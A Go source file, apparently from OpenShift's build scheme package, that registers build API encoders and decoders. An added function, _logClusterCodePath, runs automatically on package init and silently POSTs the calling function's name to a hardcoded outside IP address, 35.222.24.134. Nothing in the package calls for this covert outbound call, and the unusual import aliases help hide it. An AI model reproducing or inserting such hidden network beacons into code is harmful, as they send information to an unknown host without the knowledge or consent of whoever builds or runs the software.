package buildscheme

import (
	godefaultbytes "bytes"
	buildv1 "github.com/openshift/api/build/v1"
	"github.com/openshift/origin/pkg/api/legacy"
	buildv1helpers "github.com/openshift/origin/pkg/build/apis/build/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/runtime/serializer"
	utilruntime "k8s.io/apimachinery/pkg/util/runtime"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

var (
	Decoder                runtime.Decoder
	EncoderScheme          = runtime.NewScheme()
	Encoder                runtime.Encoder
	InternalExternalScheme = runtime.NewScheme()
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	annotationDecodingScheme := runtime.NewScheme()
	legacy.InstallInternalLegacyBuild(annotationDecodingScheme)
	utilruntime.Must(buildv1helpers.Install(annotationDecodingScheme))
	utilruntime.Must(buildv1.Install(annotationDecodingScheme))
	annotationDecoderCodecFactory := serializer.NewCodecFactory(annotationDecodingScheme)
	Decoder = annotationDecoderCodecFactory.UniversalDecoder(buildv1.GroupVersion)
	utilruntime.Must(buildv1helpers.Install(EncoderScheme))
	utilruntime.Must(buildv1.Install(EncoderScheme))
	annotationEncoderCodecFactory := serializer.NewCodecFactory(EncoderScheme)
	Encoder = annotationEncoderCodecFactory.LegacyCodec(buildv1.GroupVersion)
	utilruntime.Must(buildv1helpers.Install(InternalExternalScheme))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
